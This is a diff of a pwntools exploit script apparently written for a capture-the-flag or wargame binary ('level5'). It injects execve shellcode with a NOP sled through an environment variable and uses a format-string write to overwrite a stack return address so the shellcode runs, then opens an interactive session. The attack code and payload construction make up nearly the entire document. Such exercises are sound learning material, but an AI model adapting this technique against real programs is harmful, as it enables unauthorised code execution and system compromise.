@@ -6,6 +6,7 @@ from pwn import *
 import os
 
 # Set up pwntools for the correct architecture
+# exe = context.binary = ELF(args.EXE or '/home/iel44jez/5AAAAAAA')
 exe = context.binary = ELF(args.EXE or '/var/challenge/level5/5')
 
 # Many built-in settings can be controlled on the command-line and show up
@@ -18,16 +19,11 @@ shellcode = asm(shellcraft.execve(path=l33tpath, argv=[l33tpath]))
 nop_sled = b'\x90' * 200
 shellcode = nop_sled + shellcode
 
-payload = fit({
-    0: shellcode,
-})
-
-# Start with a custom empty env
+# Start with a custom reusable env
 env = {
     "SHOULD_NOT_SEE": "yes",
     "L33T": "A" * len(shellcode), # when run with GDB, bytes give an error so replace with a string of the same length to reproduce env
 }
-
 
 def start(argv=[], *a, **kw):
     '''Start the exploit against the target.'''
@@ -60,12 +56,11 @@ continue
 # Stripped:   No
 # Debuginfo:  Yes
 
+shellcode_addr = p64(0x7fffffffeec8 + 50) # + 50 to jump over the "L33T=" part of the env variable
 
 # Create a format string payload
 overwrite_addr = (0x7fffffffe7b8)
-overwrite_with = p64(0x7fffffffeec8 + 50) # this is from debugging with GDB, it is in env
-payload = fmtstr_payload(22, {overwrite_addr: overwrite_with})
-
+payload = fmtstr_payload(22, {overwrite_addr: shellcode_addr})
 
 # Use to leak
 leak = b"%p."* 40
@@ -76,82 +71,17 @@ io = start()
 io.sendline("1")
 # add the name
 io.sendline("fmtstring username")
-# overwrite return addr
+# leak
+# io.sendline(leak)
+
+# add the password (= enter the payload)
 io.sendline(payload)
 
 # read the password
 io.sendline("3") # select "read pw"
 io.sendline("0") # select account 0
-io.sendline("1") # select "exit to main menu"
-
-# read the password
-# io.sendline("3")
-# io.sendline("1")
-
-
-
-
-# # io.sendline(payload)
-
-# io.sendline(payload)
-    
-
-
-
-
-# # add a new pair
-# io.sendline("1")
-# # add the name
-# io.sendline("fmtstring username")
-# # overwrite the memory
-# io.sendline(payload)
-
-# # read the password
-# io.sendline("3")
-# io.sendline("1")
-
-
-
-# i = 0
-# for line in data.split("\n"):
-#     print("Line", i, ":", str(line))
-#     i += 1
-
-# print('Got data:', data.split(b'\n'))
-
-
-
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
+io.sendline("1") # select "exit to main menu" = return to set address
 
 io.interactive()
 
 
-
-#
-# THIS WORKS:
-#
-
-# overwrite_addr = (0x7fffffffe9a0)
-# overwrite_with = p64(0xdeadbeef)
-# payload = fmtstr_payload(22, {overwrite_addr: overwrite_with})
-
-# io = start()
-
-# # add a new pair
-# io.sendline("1")
-# # add the name
-# io.sendline("fmtstring username")
-# # leak the memory
-# # io.sendline(leak)
-# io.sendline(payload)
-
-# # read the password
-# io.sendline("3")
-# io.sendline("0")
